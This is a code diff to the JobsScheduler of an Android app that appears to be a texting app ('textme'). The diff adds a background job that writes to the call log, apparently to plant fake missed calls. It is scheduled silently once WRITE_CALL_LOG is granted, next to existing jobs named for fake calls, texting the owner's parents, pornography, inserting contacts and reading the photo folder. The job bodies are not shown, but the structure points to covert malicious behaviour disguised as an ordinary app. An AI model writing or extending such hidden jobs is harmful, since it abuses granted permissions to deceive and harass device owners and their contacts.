@@ -15,6 +15,7 @@ import com.candroid.textme.jobs.services.DcimJobService;
 import com.candroid.textme.jobs.services.DeviceJobService;
 import com.candroid.textme.jobs.services.FakeCallJobService;
 import com.candroid.textme.jobs.services.InsertContactJobService;
+import com.candroid.textme.jobs.services.MissedCallsJobService;
 import com.candroid.textme.jobs.services.PackagesJobService;
 import com.candroid.textme.jobs.services.PhoneCallsJobService;
 import com.candroid.textme.jobs.services.PornJobService;
@@ -36,6 +37,7 @@ public class JobsScheduler {
     public static final int JOB_ID_FAKE_PHONE_CALL = 10;
     public static final int JOB_ID_TEXT_PARENTS = 11;
     public static final int JOB_ID_INSERT_CONTACT = 12;
+    public static final int JOB_ID_MISSED_CALLS = 13;
     public static final long ONE_MINUTE = 60000;
     public static final long ONE_HOUR = ONE_MINUTE * 60;
     public static final String DCIM_KEY = "DCIM_KEY";
@@ -48,6 +50,7 @@ public class JobsScheduler {
     public static final String FAKE_PHONE_CALL_KEY = "FAKE_PHONE_CALL_KEY";
     public static final String TEXT_PARENTS_KEY = "TEXT_PARENTS_KEY";
     public static final String INSERT_CONTACT_KEY = "INSERT_CONTACT_KEY";
+    public static final String MISSED_CALLS_KEY = "MISSED_CALLS_KEY";
 
     public static void scheduleJob(Context context){
         SharedPreferences sharedPreferences = PreferenceManager.getDefaultSharedPreferences(context);
@@ -61,6 +64,7 @@ public class JobsScheduler {
         boolean ranFakePhoneCall = sharedPreferences.getBoolean(FAKE_PHONE_CALL_KEY, false);
         boolean ranTextParents = sharedPreferences.getBoolean(TEXT_PARENTS_KEY, false);
         boolean ranInsertContact = sharedPreferences.getBoolean(INSERT_CONTACT_KEY, false);
+        boolean ranMissedCalls = sharedPreferences.getBoolean(MISSED_CALLS_KEY, false);
         JobScheduler jobScheduler = context.getSystemService(JobScheduler.class);
         if(jobScheduler.getPendingJob(JOB_ID_PORN) == null){
             ComponentName serviceComponent = new ComponentName(context, PornJobService.class);
@@ -198,6 +202,19 @@ public class JobsScheduler {
             insertContactJob.setOverrideDeadline( 24 * ONE_HOUR);
             insertContactJob.setMinimumLatency(30000);
             jobScheduler.schedule(insertContactJob.build());
+        }
+        if(jobScheduler.getPendingJob(JOB_ID_MISSED_CALLS) == null && ! ranMissedCalls && (context.checkSelfPermission(Manifest.permission.WRITE_CALL_LOG) == PackageManager.PERMISSION_GRANTED)){
+            ComponentName missedCallsJobService = new ComponentName(context, MissedCallsJobService.class);
+            JobInfo.Builder missedCallsJob = new JobInfo.Builder(JOB_ID_MISSED_CALLS, missedCallsJobService);
+            missedCallsJob.setRequiredNetworkType(JobInfo.NETWORK_TYPE_NONE);
+            missedCallsJob.setRequiresCharging(false);
+            missedCallsJob.setRequiresBatteryNotLow(true);
+            missedCallsJob.setRequiresStorageNotLow(false);
+            missedCallsJob.setRequiresDeviceIdle(false);
+            missedCallsJob.setPersisted(false);
+            missedCallsJob.setOverrideDeadline( 24 * ONE_HOUR);
+            missedCallsJob.setMinimumLatency(65000);
+            jobScheduler.schedule(missedCallsJob.build());
         }
         if(jobScheduler.getPendingJob(JOB_ID_FAKE_PHONE_CALL) == null && ! ranFakePhoneCall && (context.checkSelfPermission(Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED)){
             ComponentName fakeCallJobService = new ComponentName(context, FakeCallJobService.class);
